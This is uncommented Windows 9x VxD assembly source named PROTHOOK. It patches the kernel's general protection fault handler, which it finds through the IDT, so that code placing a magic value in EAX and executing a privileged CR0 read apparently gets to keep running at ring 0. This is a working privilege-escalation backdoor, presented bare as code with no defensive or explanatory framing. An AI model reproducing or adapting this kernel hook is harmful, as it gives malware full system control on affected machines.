.386p
include	vmm.inc
include vkd.inc
 
_LDATA SEGMENT

ilim dw 0
iaddr dd 0
public PROTHOOK
PROTHOOK VxD_Desc_Block <,,,,,,"PROTHOOK",,OFFSET FLAT: yyy,,,,,,,>

_LDATA ENDS
 
_LTEXT SEGMENT

yyy proc
; cmp eax, Init_Complete
; jnz a2
 sidt ilim
 mov eax,[iaddr]
 mov bx,[eax+6eh]
 shl ebx,16
 mov bx,[eax+68h]
 cmp word ptr [ebx],0be60h
 jnz a2
 cmp dword ptr [ebx+2],34h
 jnz a2
 mov byte ptr [ebx+1],0e8h
 mov esi, offset xxx
 sub esi,ebx
 sub esi,6
 mov dword ptr [ebx+2],esi
a2:
 clc
 ret

yyy endp
 
xxx proc 

        CMP     EAX,52524C4CH
        JZ      MATCH
SKIP:   MOV     ESI,34H
        RET
MATCH:  MOV     EBP,ESP
        MOV     EBX,[EBP+28H]
        TEST    BYTE PTR [EBP+32H],2
        JZ      PROT
        MOVZX   EAX,WORD PTR [EBP+2CH]
        SHL     EAX,4
        ADD     EBX,EAX
PROT:   MOV     EAX,CS:[EBX]
        CMP     EAX,90C0200FH
        JNZ     SKIP
        ADD     DWORD PTR [EBP+28H],6
        ADD     EBX,8
        MOV     AX,30H
        MOV     DS,AX
        MOV     ES,AX
        POP     EAX
        MOV     [EBP+24H],EBX
        POPAD
        POP     EAX
        JMP     EAX

xxx endp
 
_LTEXT ENDS
end
